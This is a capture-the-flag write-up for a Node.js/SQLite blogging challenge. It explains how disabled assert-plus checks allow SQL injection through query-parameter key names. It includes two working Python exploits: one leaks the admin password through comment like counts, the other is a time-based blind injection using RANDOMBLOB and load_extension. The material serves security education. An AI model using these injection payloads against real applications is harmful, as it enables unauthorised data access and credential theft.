## SafeBlog2

Using WordPress is a bit too dangerous, so I'm developing my own blogging platform, SafeBlog2, to have full control over its security.

P.S. It is recommended to test your exploit locally before creating an online instance.

---

The task was inspired by MapleCTF 2023 `Data Explorer`, looking at environment variables causing `assert` to fail and SQL injection in the case of a limited number of queries.

Directly auditing the source code in the zip, we found that there doesn't seem to be any problem, the simple ORM implemented in `utils/db.js` uses pre-compiled binding parameters, and column names are checked with `assert`, so it seems to be flawless?

A closer inspection reveals that `assert` is used here as [`assert-plus`](https://www.npmjs.com/package/assert-plus), and a quick look of the documentation reveals that this library provides the ability to disable all `assert`s by setting an environment variable.

> Lastly, you can opt-out of assertion checking altogether by setting the environment variable `NODE_NDEBUG=1`

Looking at the `compose.yml` in the zip, we see that `NODE_NDEBUG=1` is indeed set, so we can just ignore all the `assert`s in the code, i.e., the column name checking is disabled.

> Did you know?
> 
> A similar capability exists in Python, and without having to introduce a third-party library, you can disable all `assert` in your code by setting the `PYTHONOPTIMIZE=1` environment variable.

At this point, going back to look for places in the code that directly accept user input as a column name, we found a problem with the comment liking API:

```javascript
app.get('/comment/like', async (req, res) => {
  try {
    const comments = await runQuery('comments', req.query);
    comments.forEach((comment) => {
      db.run('UPDATE comments SET likes = likes + 1 WHERE id = ?', comment.id);
    });
    res.redirect(req.headers.referer ?? '/');
  } catch {
    res.status(500).render('error', { message: 'Internal Server Error' });
  }
});
```

`req.query` is all the `GET` parameters passed in by the user, passed directly to `runQuery()` as `filter` parameters, and the column name checking in the `filterBuilder()` called by `runQuery()` fails, so all the keys of `req.query` are spliced into the SQL statement as column names. The values use precompiled binding parameters, so the SQL statement can be manipulated arbitrarily by controlling the key names, which theoretically allows for injection.

```javascript
function filterBuilder(model, filter) {
  return {
    where:
      'WHERE ' +
      Object.keys(filter)
        .map((key, index) => {
          /* Assertion ignored since NODE_NDEBUG=1 */
          // assert(models[model].includes(key), `Invalid field ${key} for model ${model}`);
          return `${key} = ?`;
        })
        .join(' AND '),
    params: Object.values(filter),
  };
}

async function runQuery(model, filter, sort) {
  queries++;
  const { where, params } = filter ? filterBuilder(model, filter) : { where: '', params: [] };
  const order_by = sort ? `ORDER BY ${sortBuilder(model, sort)}` : '';
  return new Promise((resolve, reject) => {
    db.all(`SELECT * FROM ${model} ${where} ${order_by}`, params, (err, rows) => {
      if (err) {
        reject(err);
      } else {
        resolve(rows);
        if (queries >= 4) {
          db.run(`UPDATE admins SET password = "${passwordGenerator(16)}" WHERE id = 1`);
          queries = 0;
        }
      }
    });
  });
}
```

However, if you read the code for `runQuery()`, you'll see that the password for `admin` is reset every 4 times you query with `runQuery()`, so you obviously can't just inject it to get the password, so what should you do?

### Expected solution
With a little thought, it's easy to see that the like API likes every comment in the result set, and we can create unlimited comments (creating comments without `runQuery()` won't trigger a password reset), so by cleverly constructing the SQL statement, we can indirectly leak out `admin`'s password by using the number of likes of the comments in only 3 queries, and the last one is used to login to `admin`'s account to get a Flag. .

There are many ways to construct a SQL statement, and the writeups of players are really different, but they're all pretty much the same, and the basic idea is the same. For reference, here's what the questioner did in a clumsy way.

Considering that the `admin` password string is 32 long, and each character has 16 possibilities from `0` - `F`, you can map each possibility of each character one-to-one to 512 comments. Pick the comment that corresponds to each character and like it. Based on the `id` of the comment that was liked, we can recover the password and log in to get the Flag.

```python
import re
import requests
import bs4

url = "http://<instance_url>/"


def create_comments():
    for i in range(512):
        print(i)
        # ID starts from 51
        r = requests.get(
            url + "comment/new",
            params={"name": str(51 + i), "content": str(51 + i), "post_id": 10},
        )
        assert r.status_code == 200


def generate_payload():
    query = "{} AND '5'"
    char = "id = IIF(unicode((select substr(password,{},1) from admins)) <= 57, unicode((select substr(password,{},1) from admins)) - 47, unicode((select substr(password,{},1) from admins)) - 86) + 50 + 16 * {}"
    payload = {
        query.format(
            " OR ".join([char.format(i + 1, i + 1, i + 1, i) for i in range(32)])
        ): 5
    }
    print(payload)
    return payload


def send_payload():
    r = requests.get(
        url + "comment/like", params=generate_payload(), allow_redirects=False
    )
    # Disallow redirect to avoid triggering another SQL query
    assert r.status_code == 302


def get_result():
    hex_letters = "0123456789abcdef"
    r = requests.get(url + "post/10")
    soup = bs4.BeautifulSoup(r.text, "html.parser")
    article = soup.find_all("article")[1]
    lis = article.find_all("li")
    res = ""
    for i, li in enumerate(lis[:32]):
        id = int(re.search(r"(\d+)", li.text).group(1))
        res += hex_letters[id - 50 - i * 16 - 1]
    return res


def get_flag():
    password = get_result()
    print("[+] Admin password: " + password)
    r = requests.get(url + "admin", params={"username": "admin", "password": password})
    flag = bs4.BeautifulSoup(r.text, "html.parser").find("code").text
    print("[+] Flag: " + flag)


create_comments()
print("[+] Comments created.")
send_payload()
print("[+] Payload sent.")
get_flag()
```

### Unexpected solution

The questioner was careless and the code to reset the password was written in the wrong place, so 4 players solved the question unintentionally!

```javascript
if (err) {
  reject(err);
} else {
  resolve(rows);
  if (queries >= 4) {
    db.run(`UPDATE admins SET password = "${passwordGenerator(16)}" WHERE id = 1`);
    queries = 0;
  }
}
```

It's easy to see that the counter only accumulates if the query succeeds, so if the SQL statement is constructed in a way that triggers a query error, and at the same time is capable of leaking information through a delay, it can be done as a normal time-blind injection, ignoring the count limit altogether.

Specifically, the delay can be achieved by `RANDOMBLOB()` (since `sqlite` doesn't have `SLEEP()`), and the query error can be triggered by `load_extension(1)` as long as the delay precedes the triggering of the query error, as shown in the following solution from the player `__No0♭___` for reference.

```python
def check(curr, mid):
    burp0_url = f"{HOST}/comment/like"
    burp0_headers = {"Connection": "close"}
    response = requests.get(burp0_url, params={f"'1' = ? OR CASE WHEN (SELECT unicode(substr(password,{curr},1)) FROM admins WHERE id = 1)<={mid} THEN (1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(250000000/2)))) OR load_extension(1/0)) ELSE load_extension(1/0) END;--":"zz"}, headers=burp0_headers, allow_redirects=False, proxies=PROXY)
    return response.elapsed.total_seconds() > 0.5
```

But it doesn't feel like there's much of a difference in difficulty between unintended and intended solutions (?). So it doesn't matter.
